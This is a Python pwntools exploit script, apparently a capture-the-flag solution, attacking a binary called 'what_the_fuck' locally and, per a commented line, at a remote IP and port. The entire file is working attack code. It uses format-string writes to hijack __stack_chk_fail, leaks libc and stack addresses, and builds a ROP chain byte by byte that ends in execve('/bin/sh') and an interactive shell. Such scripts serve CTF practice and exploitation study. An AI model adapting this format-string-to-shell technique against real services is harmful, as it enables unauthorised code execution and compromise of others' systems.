#/usr/bin/env python
from pwn import *

context.binary = './what_the_fuck'
#context.log_level = 'debug'
elf = ELF('./what_the_fuck')

p = process('./what_the_fuck')

#p = remote('47.91.226.78',10005)


def msg(payload):
    p.recvuntil('leave a msg: ')
    #pause()
    p.send(payload)

def cycle(number):
    if number>20:
        return number
    else:
        number = number+0x100
        return number

###########1 _stack_chk_fail => main########

p.recvuntil('input your name: ')

p.sendline(p64(elf.got['__stack_chk_fail'])) #0x0000000000601020

#_stack_chk_fail => main
# main_addr = 0x400983
# 0x4006c6--> 0x400983

payload = "%"+str(0x983)+'c%12$hn'+'AA%9$s'
payload = payload.ljust(0x18,'a')
payload += p64(elf.got['read']) #read 's really addr
#trigger _stack_chk_fail to ROP 
msg(payload)
p.recvuntil('AA')
read = u64(p.recvuntil('\x7f').ljust(0x8,"\x00"))
log.info('read_addr:'+hex(read))

read_syscall = read+0xe
log.info('read_syscall:'+hex(read_syscall))
############2-->leak stack_addr###########
p.recvuntil('input your name: ')
p.sendline('ZoE')

payload = 'A'*10+'%10$ldCC'
payload = payload.ljust(0x20,'B')
msg(payload)
p.recvuntil('A'*10)
stack_addr = int(p.recvuntil('CC',drop=True),10)
log.info('stack_addr:'+hex(stack_addr))

##########make up the stack#############

##########gadget1:0x400a60//bss:0x6010A0#####

p.recvuntil('input your name: ')
p.sendline('waht')
payload = p64(0)+p64(0x6010A0)+p64(0x400a60)
payload += 'A'*0x8
msg(payload)

#########read(0,.bss,0x3b)############

p.recvuntil('input your name: ')
p.sendline(p64(0x400a60))
payload = p64(0)+p64(1)+p64(elf.got['read'])+p64(0x3B)
msg(payload)

############change the addr############

###### 1 ###### baa_addr
bss_addr = 0x6010A0
temp = stack_addr-0xf0
log.info('modify {0} ==> {1}'.format(hex(temp),hex(bss_addr)))
for i in range(8):
    p.recvuntil('input your name: ')
    p.sendline('ZoE')
    payload = '%'+str(cycle((bss_addr>>(8*i))&0xff))+'c%9$hhn'
    payload = payload.ljust(0x18,'A')
    payload += p64(temp+i)
    msg(payload)

###### 2 ######
temp = stack_addr-0xe8
log.info('modify {0} ==> {1}'.format(hex(temp),hex(0)))
for i in range(8):
    p.recvuntil('input your name: ')
    p.sendline('ZoE')
    payload = '%'+str(cycle(0))+'c%9$hhn'
    payload = payload.ljust(0x18,'B')
    payload += p64(temp+i)
    msg(payload)

###### 3 ######    
temp = stack_addr-0xd0
log.info('modify {0} ==> {1}'.format(hex(temp),hex(0)))
for i in range(8):
    p.recvuntil('input your name: ')
    p.sendline('ZoE')
    payload = '%'+str(cycle(0))+'c%9$hhn'
    payload = payload.ljust(0x18,'C')
    payload += p64(temp+i)
    msg(payload)

###### 4 ######  gadget ---0x400a7a
temp = stack_addr-0xb8-0x60
address = 0x400A7A
log.info('modify {0} ==> {1}'.format(hex(temp),hex(address)))
for i in range(8):
    p.recvuntil('input your name: ')
    p.sendline('ZoE')
    payload = '%'+str(cycle((address>>(8*i))&0xff))+'c%9$hhn'
    payload = payload.ljust(0x18,'D')
    payload += p64(temp+i)
    msg(payload)

###### 5 ######
syscall_addr = 0x6010A8
temp = stack_addr-0xc0
log.info('modify {0} ==> {1}'.format(hex(temp),hex(syscall_addr)))
for i in range(8):
    p.recvuntil('input your name: ')
    p.sendline('ZoE')
    payload = '%'+str(cycle((syscall_addr>>(8*i))&0xff))+'c%9$hhn'
    payload = payload.ljust(0x18,'E')
    payload += p64(temp+i)
    msg(payload)

###### 6 ######    
temp = stack_addr-0xb8
log.info('modify {0} ==> {1}'.format(hex(temp),hex(0)))
for i in range(8):
    p.recvuntil('input your name: ')
    p.sendline('ZoE')
    payload = '%'+str(cycle(0))+'c%9$hhn'
    payload = payload.ljust(0x18,'F')
    payload += p64(temp+i)
    msg(payload)

p.recvuntil('input your name: ')
p.sendline('xing')
msg('ROP')
p.recvuntil('ROP')
raw_input('Go?')


payload = "/bin/sh\x00"+p64(read_syscall)
payload = payload.ljust(0x3b,'a')

p.send(payload)

#p.send(payload)
p.interactive()
